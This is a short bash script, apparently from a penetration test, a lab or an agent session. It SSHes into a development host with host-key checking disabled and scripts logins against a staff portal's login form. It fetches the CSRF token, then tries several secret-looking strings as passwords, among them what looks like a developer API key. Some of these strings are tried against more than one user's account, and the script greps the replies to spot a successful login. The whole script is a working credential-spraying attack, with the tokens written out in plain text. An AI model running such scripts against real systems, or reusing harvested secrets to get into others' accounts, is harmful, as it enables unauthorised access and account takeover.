set +e
S="ssh -o BatchMode=yes -o StrictHostKeyChecking=no rowan-dev"
$S 'bash -s' <<'RSH'
set +e
CA=/home/rowan/.local/share/keplerops/ca.crt
try(){
 u="$1"; p="$2"; rm -f /tmp/kb
 csrf=$(curl -sS -m 10 --cacert $CA -c /tmp/kb 'https://staff.keplerops.test/login' | grep -oP 'name="csrf_token" value="\K[^"]+')
 code=$(curl -sS -m 10 -o /tmp/kbout -w '%{http_code} %{redirect_url}' --cacert $CA -b /tmp/kb -c /tmp/kb --data-urlencode "csrf_token=$csrf" --data-urlencode "username=$u" --data-urlencode "password=$p" 'https://staff.keplerops.test/login/check')
 echo "USER=$u PASS=$p -> $code"
 grep -oiE 'invalid[^<]{0,60}|dashboard' /tmp/kbout | head -3
}
try rowan.ito 'fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo'
try rowan.ito 'sWQa31085FTQekZhHTxUyf_9E1marq0ur8WNCKmTtnk'
try maya.ranscombe 'sWQa31085FTQekZhHTxUyf_9E1marq0ur8WNCKmTtnk'
try rowan 'fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo'
RSH
